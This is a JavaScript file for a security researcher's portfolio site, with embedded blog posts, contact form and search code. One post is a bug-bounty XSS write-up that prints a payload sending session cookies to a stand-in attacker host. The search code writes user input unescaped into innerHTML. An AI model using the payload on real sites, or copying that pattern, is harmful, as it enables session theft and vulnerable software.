// Main JavaScript for Milan's Portfolio

// Blog Data
const blogData = {
    "blogs": [
        {
            "id": 1,
            "title": "How I Found and Exploited an XSS Vulnerability in a Fortune 500 Company",
            "date": "2025-03-15",
            "image": "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "A detailed walkthrough of discovering a persistent XSS vulnerability through improper input sanitization and achieving remote code execution...",
            "readTime": "8 min read",
            "content": `
                <div class="blog-article">
                    <div class="article-header">
                        <p class="article-lead">Discover how a simple search parameter turned into a critical security vulnerability affecting thousands of users.</p>
                    </div>
                    
                    <p>In this detailed write-up, I'll walk you through my process of discovering a critical Cross-Site Scripting (XSS) vulnerability in a Fortune 500 company's web application and how I responsibly disclosed it through their bug bounty program.</p>
                    
                    <h2>The Target</h2>
                    <p>The target was a customer portal for a major financial services company. The application appeared well-secured at first glance, with proper authentication mechanisms and apparent input validation. However, as we'll see, appearances can be deceiving.</p>
                    
                    <div class="info-box">
                        <h4>💡 Key Insight</h4>
                        <p>Never assume security based on surface-level appearance. Always test thoroughly.</p>
                    </div>
                    
                    <h2>Reconnaissance Phase</h2>
                    <p>I began with standard reconnaissance techniques:</p>
                    
                    <ul class="styled-list">
                        <li><strong>Application Mapping:</strong> Using Burp Suite to understand the application structure</li>
                        <li><strong>Input Points:</strong> Identifying all user input points including forms, URL parameters, and headers</li>
                        <li><strong>Automated Testing:</strong> Running initial scans with OWASP ZAP and custom scripts</li>
                    </ul>
                    
                    <h2>The Discovery</h2>
                    <p>While testing the search functionality, I noticed that search terms were reflected in the page without proper encoding. A simple test payload confirmed the vulnerability:</p>
                    
                    <pre><code class="language-javascript">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
                    
                    <p>To my surprise, this executed successfully, confirming the presence of an XSS vulnerability.</p>
                    
                    <h2>Exploitation</h2>
                    <p>I developed a proof-of-concept that demonstrated the severity of this issue:</p>
                    
                    <pre><code class="language-javascript">// Proof of Concept - Stealing Session Cookies
&lt;script&gt;
var img = new Image();
img.src = "https://attacker-server.com/steal?cookie=" + encodeURIComponent(document.cookie);
&lt;/script&gt;</code></pre>
                    
                    <div class="code-explanation">
                        <h5>Code Explanation:</h5>
                        <p>This payload creates an image element that sends the user's session cookie to an attacker-controlled server when executed.</p>
                    </div>
                    
                    <h2>Impact Assessment</h2>
                    <p>This vulnerability could allow an attacker to:</p>
                    
                    <div class="impact-grid">
                        <div class="impact-item">
                            <div class="impact-icon">🔓</div>
                            <h5>Session Hijacking</h5>
                            <p>Steal user session cookies and impersonate legitimate users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">⚡</div>
                            <h5>Account Takeover</h5>
                            <p>Perform actions on behalf of authenticated users</p>
                        </div>
                        <div class="impact-item">
                            <div class="impact-icon">💳</div>
                            <h5>Data Exposure</h5>
                            <p>Access sensitive financial information and transaction history</p>
                        </div>
                    </div>
                    
                    <h2>Responsible Disclosure Process</h2>
                    <p>I immediately reported this finding through the company's bug bounty program, providing:</p>
                    
                    <ol>
                        <li>Detailed vulnerability description with CVSS score</li>
                        <li>Step-by-step reproduction guide with screenshots</li>
                        <li>Proof-of-concept code demonstrating the exploit</li>
                        <li>Potential impact analysis and risk assessment</li>
                        <li>Recommended remediation steps</li>
                    </ol>
                    
                    <div class="timeline">
                        <h4>Timeline of Disclosure</h4>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 1</div>
                            <div class="timeline-content">
                                <h5>Initial Report</h5>
                                <p>Submitted detailed vulnerability report</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 2</div>
                            <div class="timeline-content">
                                <h5>Triaged</h5>
                                <p>Security team confirmed the issue and assigned P1 priority</p>
                            </div>
                        </div>
                        <div class="timeline-item">
                            <div class="timeline-date">Day 7</div>
                            <div class="timeline-content">
                                <h5>Resolved</h5>
                                <p>Vulnerability fixed with proper input sanitization</p>
                            </div>
                        </div>
                    </div>
                    
                    <h2>Resolution</h2>
                    <p>The company's security team responded within 24 hours, confirmed the issue, and implemented proper input sanitization. The vulnerability was fixed within one week, and I received a bounty for my findings.</p>
                    
                    <div class="key-takeaway">
                        <h3>📚 Key Takeaway</h3>
                        <p>Never underestimate the importance of proper input validation and output encoding, even in seemingly minor application features. A single unvalidated parameter can compromise an entire application's security.</p>
                    </div>
                </div>
            `,
            "tags": ["XSS", "Bug Bounty", "Web Security", "Vulnerability", "Penetration Testing"]
        },
        {
            "id": 2,
            "title": "A Beginner's Guide to Web Application Penetration Testing Methodology",
            "date": "2025-03-08", 
            "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Learn the systematic approach to web application penetration testing, from reconnaissance to reporting, with practical examples and tools...",
            "readTime": "12 min read",
            "content": `<div class="blog-article">Professional penetration testing content would go here...</div>`,
            "tags": ["Penetration Testing", "Methodology", "Web Security", "Beginners Guide"]
        },
        {
            "id": 3,
            "title": "Top 5 Custom Security Tools Every Bug Hunter Should Have in Their Arsenal",
            "date": "2025-03-01",
            "image": "https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1200&h=600&fit=crop&crop=center",
            "author": "Milan",
            "excerpt": "Discover the essential custom tools and scripts that can significantly improve your efficiency in finding and exploiting security vulnerabilities...",
            "readTime": "10 min read",
            "content": `<div class="blog-article">Security tools content would go here...</div>`,
            "tags": ["Security Tools", "Automation", "Bug Hunting", "Custom Scripts"]
        }
    ]
};

// Global variables for blog system
let currentView = 'latest';
let currentSearchTerm = '';

// ============================================
// SHARE FUNCTIONALITY - FIXED LINK GENERATION
// ============================================

function createShareUrl(blogId) {
    // Get the current page URL without any parameters
    const baseUrl = window.location.origin + window.location.pathname;
    // Create a direct link that goes to blog section with the specific blog
    return `${baseUrl}#blog?post=${blogId}`;
}

function addShareButton(blog) {
    return `
        <div class="blog-share-wrapper">
            <button class="share-link-btn" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                <i class="bi bi-link-45deg"></i>
                <span>Copy Link</span>
            </button>
            <span class="share-feedback" id="share-feedback-${blog.id}"></span>
        </div>
    `;
}

function copyBlogLink(blogId) {
    const shareUrl = createShareUrl(blogId);
    
    // Create temporary input element
    const tempInput = document.createElement('input');
    tempInput.value = shareUrl;
    document.body.appendChild(tempInput);
    tempInput.select();
    tempInput.setSelectionRange(0, 99999);
    
    try {
        // Try Clipboard API first
        navigator.clipboard.writeText(shareUrl).then(() => {
            showCopyFeedback(blogId);
        }).catch(() => {
            // Fallback for older browsers
            document.execCommand('copy');
            showCopyFeedback(blogId);
        });
    } catch (err) {
        // Final fallback
        document.execCommand('copy');
        showCopyFeedback(blogId);
    }
    
    // Clean up
    document.body.removeChild(tempInput);
}

function showCopyFeedback(blogId) {
    const feedbackEl = document.getElementById(`share-feedback-${blogId}`);
    if (feedbackEl) {
        feedbackEl.textContent = "✓ Link copied!";
        feedbackEl.style.opacity = "1";
        
        setTimeout(() => {
            feedbackEl.style.opacity = "0";
            setTimeout(() => {
                feedbackEl.textContent = "";
            }, 300);
        }, 2000);
    }
}

// Make function available globally
window.copyBlogLink = copyBlogLink;

// ============================================
// URL HANDLING FOR DIRECT BLOG LINKS
// ============================================

function handleDirectBlogLink() {
    // Check if URL has blog parameter
    const hash = window.location.hash;
    if (hash) {
        const match = hash.match(/#blog\?post=(\d+)/);
        if (match) {
            const blogId = parseInt(match[1]);
            const blog = blogData.blogs.find(b => b.id === blogId);
            if (blog) {
                // Scroll to blog section first
                const blogSection = document.getElementById('blog');
                if (blogSection) {
                    blogSection.scrollIntoView({ behavior: 'smooth' });
                }
                
                // Open the blog modal after a short delay
                setTimeout(() => {
                    openBlogModal(blogId);
                }, 800);
            }
        }
    }
}

// ============================================
// MAIN INITIALIZATION
// ============================================

document.addEventListener("DOMContentLoaded", () => {
    // Initialize AOS
    AOS.init({
        duration: 1000,
        once: true,
        offset: 100
    });

    // Initialize all components
    initNavbar();
    initScrollEffects();
    initContactForm();
    initBlogSystem();
    initStatisticsCounter();
    initOWASPTooltips();
    
    // Handle direct blog links
    handleDirectBlogLink();
});

// ============================================
// NAVBAR FUNCTIONALITY
// ============================================

function initNavbar() {
    const navbarLinks = document.querySelectorAll(".nav-link");
    const navbarCollapse = document.querySelector(".navbar-collapse");
    const navbarToggler = document.querySelector(".navbar-toggler");
    const navbar = document.querySelector(".navbar");

    navbarLinks.forEach(link => {
        link.addEventListener("click", () => {
            if (navbarCollapse.classList.contains("show")) {
                navbarToggler.click();
            }
        });
    });

    document.addEventListener('click', (e) => {
        if (navbarCollapse.classList.contains('show') && !navbar.contains(e.target)) {
            navbarToggler.click();
        }
    });

    window.addEventListener("scroll", () => {
        if (window.scrollY > 50) {
            navbar.classList.add("scrolled");
        } else {
            navbar.classList.remove("scrolled");
        }
    });
}

// ============================================
// SCROLL EFFECTS
// ============================================

function initScrollEffects() {
    const backToTop = document.querySelector(".back-to-top");

    window.addEventListener("scroll", () => {
        if (window.scrollY > 100) {
            backToTop.style.display = "block";
        } else {
            backToTop.style.display = "none";
        }
    });

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            if (href === '#') return;
            
            e.preventDefault();
            const target = document.querySelector(href);
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// ============================================
// OWASP TOOLTIPS
// ============================================

function initOWASPTooltips() {
    const badges = document.querySelectorAll('.owasp-badge');
    
    badges.forEach(badge => {
        badge.addEventListener('mouseenter', function() {
            const tooltip = this.getAttribute('data-tooltip');
            this.setAttribute('title', tooltip);
        });
        
        badge.addEventListener('mouseleave', function() {
            this.removeAttribute('title');
        });
    });
}

// ============================================
// STATISTICS COUNTER
// ============================================

function initStatisticsCounter() {
    const statNumbers = document.querySelectorAll('.stat-number');
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                animateCounter(entry.target);
                observer.unobserve(entry.target);
            }
        });
    }, { threshold: 0.5 });
    
    statNumbers.forEach(counter => observer.observe(counter));
}

function animateCounter(counter) {
    const target = parseInt(counter.getAttribute('data-count'));
    const suffix = counter.getAttribute('data-suffix') || '+';
    const duration = 2000;
    const step = target / (duration / 16);
    
    let current = 0;
    const timer = setInterval(() => {
        current += step;
        if (current >= target) {
            counter.textContent = target + suffix;
            clearInterval(timer);
        } else {
            counter.textContent = Math.floor(current) + suffix;
        }
    }, 16);
}

// ============================================
// CONTACT FORM WITH EMAILJS - WORKING VERSION
// ============================================

function initContactForm() {
    const contactForm = document.getElementById("contactForm");
    const successPopup = document.getElementById("successPopup");
    const closePopup = document.getElementById("closePopup");

    // Your EmailJS credentials
    const EMAILJS_CONFIG = {
        PUBLIC_KEY: "2X9gef2Tudenoiugp",
        SERVICE_ID: "service_85d3r1y",
        TEMPLATE_ID: "template_ogzw9jc"
    };

    // Initialize EmailJS
    emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);

    if (contactForm) {
        contactForm.addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Get form data - EXACT variable names as in your template
            const templateParams = {
                name: document.getElementById("name").value.trim(),
                email: document.getElementById("email").value.trim(),
                subject: document.getElementById("subject").value.trim(),
                message: document.getElementById("message").value.trim(),
                date: new Date().toLocaleDateString('en-US', { 
                    weekday: 'long', 
                    year: 'numeric', 
                    month: 'long', 
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit'
                }),
                page_url: window.location.href
            };
            
            // Validate
            if (!templateParams.name || !templateParams.email || !templateParams.subject || !templateParams.message) {
                alert("Please fill in all fields.");
                return;
            }
            
            // Show loading state
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = 'Sending...';
            submitBtn.disabled = true;
            
            console.log("Sending email with params:", templateParams);
            
            // Send email using EmailJS
            emailjs.send(
                EMAILJS_CONFIG.SERVICE_ID,
                EMAILJS_CONFIG.TEMPLATE_ID,
                templateParams
            )
            .then(function(response) {
                console.log('✅ SUCCESS!', response.status, response.text);
                successPopup.classList.add("active");
                contactForm.reset();
            })
            .catch(function(error) {
                console.error('❌ ERROR:', error);
                
                // Show detailed error
                let errorMsg = "Failed to send message. ";
                
                if (error.status === 0) {
                    errorMsg += "Check your internet connection.";
                } else if (error.status === 400) {
                    errorMsg += "Template variables don't match.";
                } else if (error.status === 401) {
                    errorMsg += "Invalid Public Key.";
                } else if (error.status === 404) {
                    errorMsg += "Service or Template not found.";
                } else {
                    errorMsg += `Error code: ${error.status}`;
                }
                
                alert(errorMsg + "\n\nEmail me directly at: gautammilan2024@gmail.com");
            })
            .finally(function() {
                // Reset button
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
            });
        });
    }

    // Close popup functionality
    if (closePopup) {
        closePopup.addEventListener("click", () => {
            successPopup.classList.remove("active");
        });
    }

    // Close popup when clicking outside
    window.addEventListener("click", (e) => {
        if (e.target === successPopup) {
            successPopup.classList.remove("active");
        }
    });
    
    // Test connection on page load
    testEmailJSConnection();
}

// Test EmailJS connection
function testEmailJSConnection() {
    console.log("Testing EmailJS connection...");
    console.log("Public Key:", "2X9gef2Tudenoiugp");
    console.log("Service ID:", "service_85d3r1y");
    console.log("Template ID:", "template_ogzw9jc");
    
    // Small test to verify connection
    setTimeout(() => {
        emailjs.init("2X9gef2Tudenoiugp");
        console.log("✅ EmailJS initialized successfully");
    }, 1000);
}

// ============================================
// BLOG SYSTEM
// ============================================

function initBlogSystem() {
    loadBlogs();
    
    document.getElementById('search-button').addEventListener('click', handleSearch);
    document.getElementById('clear-button').addEventListener('click', clearSearch);
    document.getElementById('view-all-btn').addEventListener('click', viewAllBlogs);
    document.getElementById('back-to-latest').addEventListener('click', backToLatest);
    
    const searchInput = document.getElementById('blog-search');
    if (searchInput) {
        searchInput.addEventListener('input', handleSearch);
    }
}

function getLatestBlogs() {
    return blogData.blogs
        .sort((a, b) => new Date(b.date) - new Date(a.date))
        .slice(0, 4);
}

function loadBlogs() {
    const blogContainer = document.getElementById('blog-container');
    const searchResultsInfo = document.getElementById('search-results-info');
    const noResultsMessage = document.getElementById('no-results-message');
    const viewAllButton = document.getElementById('view-all-btn');
    const backToLatestButton = document.getElementById('back-to-latest');
    const showingCount = document.getElementById('showing-count');
    const totalCount = document.getElementById('total-count');
    
    if (!blogContainer) return;

    blogContainer.innerHTML = '';
    
    let blogsToShow = [];
    
    if (currentView === 'latest') {
        blogsToShow = getLatestBlogs();
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'inline-block';
        if (backToLatestButton) backToLatestButton.style.display = 'none';
    } 
    else if (currentView === 'all') {
        blogsToShow = blogData.blogs.sort((a, b) => new Date(b.date) - new Date(a.date));
        if (searchResultsInfo) searchResultsInfo.style.display = 'none';
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    else if (currentView === 'search') {
        blogsToShow = searchBlogs(currentSearchTerm);
        if (searchResultsInfo) {
            searchResultsInfo.style.display = 'block';
            searchResultsInfo.innerHTML = `Found ${blogsToShow.length} results for "${currentSearchTerm}"`;
        }
        if (viewAllButton) viewAllButton.style.display = 'none';
        if (backToLatestButton) backToLatestButton.style.display = 'inline-block';
    }
    
    if (noResultsMessage) {
        noResultsMessage.style.display = blogsToShow.length === 0 ? 'block' : 'none';
    }
    
    if (showingCount) showingCount.textContent = blogsToShow.length;
    if (totalCount) totalCount.textContent = blogData.blogs.length;
    
    blogsToShow.forEach(blog => {
        const formattedDate = formatDate(blog.date);
        
        const blogHTML = `
            <div class="col-md-6 col-lg-4" data-aos="fade-up">
                <article class="blog-card">
                    <div class="blog-card-image">
                        <img src="${blog.image}" alt="${blog.title}">
                    </div>
                    
                    <div class="blog-card-content">
                        <div class="blog-meta">
                            <span class="blog-author">By ${blog.author}</span>
                            <span class="blog-date">${formattedDate}</span>
                        </div>
                        
                        <h3 class="blog-title">${blog.title}</h3>
                        <p class="blog-excerpt">${blog.excerpt}</p>
                        
                        <div class="blog-reading-info">
                            <span class="read-time">${blog.readTime}</span>
                        </div>
                        
                        <div class="blog-tags">
                            ${blog.tags.slice(0, 4).map(tag => `<span class="tag">${tag}</span>`).join('')}
                        </div>
                        
                        <div class="blog-actions">
                            ${addShareButton(blog)}
                            <a href="#" class="read-more-btn" onclick="openBlogModal(${blog.id})">
                                Read Full Story <i class="bi bi-arrow-right"></i>
                            </a>
                        </div>
                    </div>
                </article>
            </div>
        `;
        blogContainer.innerHTML += blogHTML;
    });
}

function searchBlogs(searchTerm) {
    if (!searchTerm.trim()) return [];
    
    const term = searchTerm.toLowerCase();
    return blogData.blogs.filter(blog => 
        blog.title.toLowerCase().includes(term) ||
        blog.excerpt.toLowerCase().includes(term) ||
        blog.content.toLowerCase().includes(term) ||
        blog.tags.some(tag => tag.toLowerCase().includes(term))
    ).sort((a, b) => new Date(b.date) - new Date(a.date));
}

function formatDate(dateString) {
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays === 1) return 'Yesterday';
    if (diffDays < 7) return `${diffDays} days ago`;
    if (diffDays < 30) return `${Math.floor(diffDays / 7)} weeks ago`;
    
    const options = { month: 'short', day: 'numeric', year: 'numeric' };
    return date.toLocaleDateString('en-US', options);
}

function viewAllBlogs() {
    currentView = 'all';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function backToLatest() {
    currentView = 'latest';
    currentSearchTerm = '';
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    loadBlogs();
}

function handleSearch() {
    const searchInput = document.getElementById('blog-search');
    if (!searchInput) return;
    
    const searchTerm = searchInput.value.trim();
    
    if (searchTerm === '') {
        currentView = 'latest';
        currentSearchTerm = '';
    } else {
        currentView = 'search';
        currentSearchTerm = searchTerm;
    }
    
    loadBlogs();
}

function clearSearch() {
    const searchInput = document.getElementById('blog-search');
    if (searchInput) searchInput.value = '';
    currentView = 'latest';
    currentSearchTerm = '';
    loadBlogs();
}

// ============================================
// BLOG MODAL
// ============================================

function openBlogModal(blogId) {
    const blog = blogData.blogs.find(b => b.id === blogId);
    if (!blog) return;

    const shareUrl = createShareUrl(blogId);
    const formattedDate = formatDate(blog.date);

    const modalHTML = `
        <div class="modal-dialog modal-xxl modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content blog-modal-content">
                <div class="modal-header blog-modal-header">
                    <div class="blog-header-content">
                        <span class="blog-date-modal">${formattedDate}</span>
                        <button class="share-link-btn share-btn-large" onclick="copyBlogLink(${blog.id})" title="Copy link to share">
                            <i class="bi bi-link-45deg"></i>
                            <span>Share Article</span>
                        </button>
                    </div>
                    <button type="button" class="close-btn" data-bs-dismiss="modal" aria-label="Close">
                        <i class="bi bi-x-lg"></i>
                    </button>
                </div>
                
                <div class="modal-body blog-modal-body">
                    <article class="blog-article-full">
                        <header class="article-header-full">
                            <h1 class="article-title-full">${blog.title}</h1>
                            <div class="article-meta-full">
                                <span class="article-author">By ${blog.author}</span>
                                <span class="article-read-time">${blog.readTime}</span>
                            </div>
                            <div class="article-featured-image">
                                <img src="${blog.image}" alt="${blog.title}">
                            </div>
                        </header>
                        
                        <div class="article-content-full">
                            ${blog.content}
                        </div>
                        
                        <footer class="article-footer-full">
                            <div class="article-tags-full">
                                <strong>Topics:</strong>
                                <div class="tags-container">
                                    ${blog.tags.map(tag => `<span class="article-tag">${tag}</span>`).join('')}
                                </div>
                            </div>
                            <div class="share-section">
                                <h5>Share This Article</h5>
                                <p>Copy the link below to share on any platform:</p>
                                <div class="share-link-container">
                                    <input type="text" readonly value="${shareUrl}" class="share-link-input" id="share-link-${blog.id}">
                                    <button class="copy-link-btn" onclick="copyInputLink(${blog.id})">
                                        <i class="bi bi-clipboard"></i> Copy
                                    </button>
                                </div>
                            </div>
                        </footer>
                    </article>
                </div>
                
                <div class="modal-footer blog-modal-footer">
                    <button type="button" class="close-article-btn" data-bs-dismiss="modal">
                        <i class="bi bi-arrow-left"></i> Back to Articles
                    </button>
                </div>
            </div>
        </div>
    `;

    const modal = document.getElementById('dynamicBlogModal');
    modal.innerHTML = modalHTML;
    
    const bsModal = new bootstrap.Modal(modal);
    bsModal.show();
    
    // Update URL hash for direct linking
    if (history.pushState) {
        window.history.pushState({}, '', `#blog?post=${blogId}`);
    }
}

function copyInputLink(blogId) {
    const input = document.getElementById(`share-link-${blogId}`);
    if (input) {
        input.select();
        input.setSelectionRange(0, 99999);
        
        navigator.clipboard.writeText(input.value).then(() => {
            const btn = input.nextElementSibling;
            const originalHTML = btn.innerHTML;
            btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
            btn.style.background = '#28a745';
            
            setTimeout(() => {
                btn.innerHTML = originalHTML;
                btn.style.background = '';
            }, 2000);
        });
    }
}

// Make functions available globally
window.openBlogModal = openBlogModal;
window.copyInputLink = copyInputLink;

